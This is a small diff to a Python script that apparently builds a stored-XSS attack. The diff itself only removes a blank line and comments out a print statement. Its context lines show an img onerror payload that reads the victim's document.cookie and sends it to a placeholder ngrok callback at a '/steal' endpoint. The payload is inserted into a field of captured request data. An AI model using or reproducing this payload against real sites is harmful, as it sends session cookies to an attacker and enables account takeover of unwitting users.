@@ -11,7 +11,6 @@ def load_json_postData():
     return postData.split("|")
 
 
-
 def load_json_cookie():
     file_path = Path("captured_request_js.json")
 
@@ -26,4 +25,4 @@ if __name__ == "__main__":
     CALLBACK_URL = "https://your-ngrok-url.ngrok-free.app"
     XSS_PAYLOAD_TEMPLATE = f"""<img src="invalid" onerror="var cookie = document.cookie;fetch('{CALLBACK_URL}/steal?cookie=' + encodeURIComponent(cookie),{{method: 'get', headers: new Headers({{'ngrok-skip-browser-warning': '69420'}})}}).then( () => {{console.log('cookie sent')}})">"""
     t[11] = XSS_PAYLOAD_TEMPLATE
-    print("|".join(t))
+    # print("|".join(t))
